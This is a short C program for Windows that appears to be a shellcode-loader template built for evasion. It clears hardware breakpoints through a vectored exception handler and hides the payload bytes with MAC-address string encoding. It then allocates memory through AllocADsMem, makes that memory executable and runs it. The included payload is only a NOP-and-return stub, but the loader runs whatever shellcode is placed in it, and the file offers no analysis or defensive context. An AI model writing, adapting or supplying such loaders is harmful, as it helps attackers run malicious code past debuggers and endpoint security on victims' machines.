#include <windows.h>
#include <activeds.h>
#include <ip2string.h>
#include <stdio.h>
#include <string.h>

static LONG CALLBACK VehHandler(PEXCEPTION_POINTERS info) {
    if (info && info->ContextRecord) {
        info->ContextRecord->Dr7 = 0;
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

static void load_type1_payload(const unsigned char *payload, size_t len) {
    const char *b64_table = "ABCDEFGHIJ01234ZYXWVUTSRQPONMLKzyxwvutsrqponmlkjihgfedcba98765/+";
    AddVectoredExceptionHandler(1, VehHandler);

    char mac_str[32] = { 0 };
    RtlEthernetAddressToStringA((const DL_EUI48 *)payload, mac_str);

    void *buf = AllocADsMem((DWORD)len);
    if (buf) {
        PCSTR term = NULL;
        RtlEthernetStringToAddressA(mac_str, &term, (DL_EUI48 *)buf);
        DWORD old = 0;
        VirtualProtect(buf, len, PAGE_EXECUTE_READWRITE, &old);
        ((void (*)(void))buf)();
    }
    printf("%s\n", b64_table);
}

int main(void) {
    unsigned char raw[6] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0xC3 };
    load_type1_payload(raw, sizeof(raw));
    return 0;
}
